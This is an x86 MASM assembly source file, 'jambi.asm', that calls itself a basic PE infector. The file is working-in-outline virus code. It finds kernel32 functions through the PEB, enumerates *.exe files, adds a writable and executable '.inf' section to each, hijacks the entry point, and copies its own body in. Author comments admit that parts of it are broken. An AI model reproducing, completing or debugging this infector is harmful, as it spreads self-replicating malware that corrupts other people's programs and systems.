;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
; jambi.asm
; By mathie_m
;
;	Basic pe infector
;   Add manually writing rights on section before executing it for first gen
;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
.386
.model flat, stdcall
option casemap:none
assume fs:nothing

    include \masm32\include\windows.inc
    include \masm32\include\user32.inc
    include \masm32\include\kernel32.inc
    include \masm32\include\masm32.inc
    include \masm32\include\msvcrt.inc
    
    includelib \masm32\lib\user32.lib
    includelib \masm32\lib\kernel32.lib
    includelib \masm32\lib\masm32.lib
    includelib \masm32\lib\msvcrt.lib
    
.code
Jambi:
	VirusStart:
	call _delta
			_delta: 
				pop ebp
				sub ebp, offset _delta
				
				mov eax, VirusEnd
				sub eax, VirusStart
				mov [ebp+MaliciousCodeSize],eax       ; Save Malicious code size
                
				call _FindGetProcAddress
                mov [ebp + GtProcAdH], eax
                mov [ebp + Kernel32H], edx
                call _FindRequiredAPIs
						
	
	
			_findFirstFile:
			lea ebx, [ebp + FindData]
			lea edx, [ebp + FileMask]
			push ebx
			push edx
			call [ebp + FindFirstFileAH]
			cmp eax, -1                                 ; If no file 
			jz _exit                               		; Then exit
			mov [ebp+FindHandle],eax               		; Else, save the returned handle into FindHandle

_createFile:
	push 0
	push FILE_ATTRIBUTE_NORMAL
	push OPEN_EXISTING
	push 0
	push 0
	push GENERIC_WRITE or GENERIC_READ
	lea ebx, [ebp + FindData.cFileName]
	push ebx
	call [ebp + CreateFileAH]
	cmp eax, -1
	jz _nextFile
    mov [ebp+FileHandle],eax               		; Stock returned value in FileHandle


_getFileSize:
	push [ebp+FindData.nFileSizeHigh]                 
    push [ebp+FileHandle]
	call [ebp+GetFileSizeH]
	cmp eax, 01h								; If file size < 1
    jl _nextFile                                ; Go to next file
    mov DWORD ptr [ebp+FileSize],eax                ; Save the size of the file into FileSize
	

_mapFile:
	push 0
	push [ebp+FindData.nFileSizeLow]
	push [ebp+FindData.nFileSizeHigh]
	push PAGE_READWRITE
	push 0
	push [ebp+FileHandle]
	call [ebp + CreateFileMappingAH]
    mov DWORD ptr[ebp+MapFileHandle],eax            ; Stock returned value in MapFIleHandle
    .if [ebp+MapFileHandle] == INVALID_HANDLE_VALUE   ; If mapping failed
        push [ebp+FileHandle]
		call [ebp+CloseHandleH]
        jmp _nextFile                           ; Go to nextFile
    .endif

	
_getFileContent:
	push [ebp+FindData.nFileSizeHigh]
	push 0
	push 0
	push FILE_MAP_READ or FILE_MAP_WRITE
	push [ebp+MapFileHandle]
	call [ebp+MapViewOfFileH]
    mov DWORD ptr[ebp+FileContent],eax              ; Save returned value into FileContent
    .if eax == 0                                ; If FileContent == 0
		push [ebp+FileHandle]
		call [ebp+CloseHandleH]
        jmp _nextFile                           ; Go to nextFile
    .endif

_checkDosHeader:
    mov esi,[ebp+FileContent]
    assume esi:ptr IMAGE_DOS_HEADER             
    .if [esi].e_magic != IMAGE_DOS_SIGNATURE    ; If not DOS header
        push [ebp+FileHandle]
		call [ebp+CloseHandleH]
        jmp _nextFile                           ; Go to nextFile
    .endif

_checkPEHeader:
    add esi,[esi].e_lfanew                      ; Stock PE Header pointer in ESI register
    assume esi:ptr IMAGE_NT_HEADERS             ; Assume register as a IMAGE_NT_HEADERS structure pointer
    .if [esi].Signature != IMAGE_NT_SIGNATURE   ; If magic number is not a valid PE magic number
        push [ebp+FileHandle]
		call [ebp+CloseHandleH]
        jmp _nextFile                           ;    Proceed with next file (jmp to _nextFile label)
    .endif

_addSection:
    xor ebx,ebx
    mov bx,[esi].FileHeader.NumberOfSections    ; ax = original number of section
    mov eax,ebx
    inc eax
    mov [esi].FileHeader.NumberOfSections,ax    ; set new NumberOfSection in the header
	
_saveOldEntryPoint:
    mov eax,[esi].OptionalHeader.AddressOfEntryPoint
    mov DWORD ptr [OldEntryPointAddr],eax       ; save original EntryPoint address
    
_setNewEntryPoint:
    mov eax,[esi].OptionalHeader.SizeOfImage
    mov [esi].OptionalHeader.AddressOfEntryPoint,eax ; Update AddressOfEntryPoint with new Entry point
    mov DWORD ptr [ImageSize],eax

_setNewImageSize:
    mov eax,[esi].OptionalHeader.SizeOfImage    ; get original Size of Image
    add eax,1000h                               ; increment it by virtual size of a section
    mov [esi].OptionalHeader.SizeOfImage,eax    ; replace it

_gotoLastSection:
    add esi,sizeof(IMAGE_NT_HEADERS)            ; esi = section header address
    assume esi:ptr IMAGE_SECTION_HEADER
    mov eax,sizeof(IMAGE_SECTION_HEADER)        ; eax = section header size
    mov ecx,ebx                                 ; ecx counter = Original number of sections
    mul ecx                                     ; eax = eax * ecx
    add esi,eax                                 ; esi = Last Section Header address
    
_editHeader:
    assume esi:ptr IMAGE_SECTION_HEADER
    xor ecx,ecx
    mov DWORD ptr [esi].Name1, "fni."           ; Set section name to ".inf"
    mov [esi].Misc.PhysicalAddress,ecx          ; PhysicalAddress = 0
    mov [esi].Misc.VirtualSize,1000h            ; VirtualSize = 1000h
    push [ebp + ImageSize]
    pop [esi].VirtualAddress                    ; VirtualAdress = original ImageSize
    mov eax, [ebp + MaliciousCodeSize]
    mov [esi].SizeOfRawData,eax                 ; SizeOfRawData = ShellCode size
    mov eax, [ebp+FileSize]
    mov [esi].PointerToRawData,eax              ; Set PointerToRawData to the end of file
    mov [esi].Characteristics,0E0000020h        ; rwx flag
	
; Copy virus in the new section
_cpyShellcode:
    mov edi,[ebp+FileContent]
    add edi,[ebp+FileSize]                      ; edi = FileContent addr + original file size (end of file)
    mov esi,VirusStart							; esi = beginning of the virus
    mov ecx,[ebp+MaliciousCodeSize]             ; ecx = MaliciousCodeSize
	rep movsb									; doesn't work.....
	
_setOldEntryPoint:
    mov DWORD ptr [edi],0E9h                    ; E9 = JMP
    inc edi                                     ; go to next byte
    mov ecx, [ebp+ImageSize]                           ; ecx = New entry point offset (original ImageSize)
	sub ecx, [ebp+OldEntryPointAddr]                   ; ecx = New entry point offset - Old entry point offset
    xor eax,eax
    sub eax,ecx                                 ; eax = 0 - ecx
    sub eax,[ebp+MaliciousCodeSize]                       ; eax = eax - ShellCode size
    sub eax,05h                                 ; eax = eax - 5 (size of jmp instruction)
    mov DWORD ptr [edi],eax                     ; Write Old EntryPoint address
	
_writeFile:
	push 0
	push 0
	push 0
	push [ebp+FileHandle]
	call [ebp+SetFilePointerH]
	cmp eax,INVALID_SET_FILE_POINTER
    je _nextFile                               ; If Fail go to next file
	
    mov eax, [ebp+MaliciousCodeSize]
    mov ecx, [ebp+FileSize]
    add ecx,eax
    add ecx,5h                                 ; ecx = File size + ShellCode size + 5
    lea eax, [ebp+ByteRead]                    ; eax = pointer to ByteRead
    push 0h                                    ; lpOverlapped:LPOVERLAPPED = 0
    push eax                                   ; lpNumberOfBytesWritten:LPDWORD = &ByteRead
    push ecx                                   ; nNumberOfBytesToWrite:DWORD = File size + Virus size + 5
    push [ebp+FileContent]                     ; lpBuffer:LPCVOID = FileContent
    push [ebp+FileHandle]
	call [ebp+WriteFileH]


_nextFile:
	lea ebx, [ebp + FindData]
	mov edx, [ebp + FindHandle]
	push ebx
	push edx
	call FindNextFile
    .if eax == 0                              ; If no file found
        jmp _exit                             ; Then exit
    .else                                     ; Else
        jmp _createFile                       ; Go to createFile
    .endif

_closeFile:
	push [ebp+FileHandle]
	call [ebp+CloseHandleH]
	jmp _nextFile
	
_FindGetProcAddress:
    mov ebx, fs:[030h]							; Get Kernel32 base
    mov ebx, [ebx + 0ch]
    mov ebx, [ebx + 0ch]
    mov ebx, [ebx + 00h]
    mov ebx, [ebx + 00h]
    mov eax, [ebx + 18h]
               
    mov ebx, [eax + 3Ch]   						; Get export table address
	add ebx, eax
    mov ebx, [ebx + 78h]						; PIMAGE_NT_HEADERS->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]->VirtualAddres
    add ebx, eax
    push ebx
               
    mov ebx, [ebx + 20h] 						;  PIMAGE_EXPORT_DIRECTORY->AddressOfNames = 0x20
    add ebx, eax
    xor edx, edx
		_loop:
		lea esi, [ebp + GetProcAddressN] 		; Searching GetProcAddress
		mov edi, [ebx + edx]
		add edi, eax
		mov ecx, 0Fh
		add edx, 04h
		repz cmpsb
		jnz _loop 								; If not found, loop until we find it
	sub edx, 04h
    shr edx, 01h
               
    pop ebx
               
    mov edi, [ebx + 24h]						; PIMAGE_EXPORT_DIRECTORY->AddressOfNameOrdinals = 0x24
    add edi, eax
    movzx edx, word ptr[edi + edx]	 			; Index for AddressOfFunctions
	shl edx, 02h 								; 4 bytes
               
    mov edi, [ebx + 1Ch] 						; PIMAGE_EXPORT_DIRECTORY->AddressOfFunctions
    add edi, eax
               
    mov edi, [edi + edx] 						;Load GetProcAddress address in edi
    add edi, eax
	
    mov edx, eax 								;edx = Kernel base address
    mov eax, edi 								;eax = GetProcAddress address
    retn
 
 _FindRequiredAPIs:
	lea edi, [ebp + ApiN] 						; Name of funcs we need
	lea esi, [ebp + ApiH]						; Handlers of these functions
	mov ebx, [ebp + Kernel32H] 					; move Kernel32 base to ebx
	
	FindAPI_Loop:
		push edi
		push ebx
		call [ebp + GtProcAdH]  				; call GetProcAddress
		mov dword ptr[esi], eax 				; save returned pointer
		xor eax, eax
		repnz scasb								; find func
		add esi, 04h							; Points to the next handle
		cmp byte ptr[edi], 00h  				; If it's not the end of the list
		jnz FindAPI_Loop						; Get Next func addr
	retn
	
_exit:
	push 0
    call [ebp+ExitProcessH]                     ; Exit

_data:
		Kernel32H                       dd ?
        GtProcAdH                       dd ?
        GetProcAddressN                 db "GetProcAddress",0
        ExitProcessN            		db "ExitProcess",0
 
        ApiN                        	db "FindFirstFileA",0
										db "FindNextFileA",0
										db "CreateFileA",0
										db "CreateFileMappingA",0
										db "MapViewOfFile",0
										db "CloseHandle",0
										db "UnmapViewOfFile",0
										db "SetFilePointer",0
										db "WriteFile", 0
										db "GetFileSize", 0
										db "ExitProcess",0
										db 0
    ApiH:
    FindFirstFileAH             		dd ?
    FindNextFileAH      				dd ?
    CreateFileAH        				dd ?
    CreateFileMappingAH 				dd ?
    MapViewOfFileH              		dd ?
    CloseHandleH                		dd ?
    UnmapViewOfFileH    				dd ?
	SetFilePointerH						dd ?
	WriteFileH							dd ?
	GetFileSizeH						dd ?
	ExitProcessH						dd ?
 
    ImageSize           				dd  0
    FileSize            				dd  0
    OldEntryPointAddr   				dd  0
    MaliciousCodeSize       			dd  0
    ByteRead            				dd  ?
	FileHandle							dd 	0
    FileMask            				db  "*.exe",0            
    FindHandle          				dd  0                     
    FindData            				WIN32_FIND_DATA <>                     
    MapFileHandle       				dd  0                     
    FileContent         				dd  0
	
VirusEnd:
end Jambi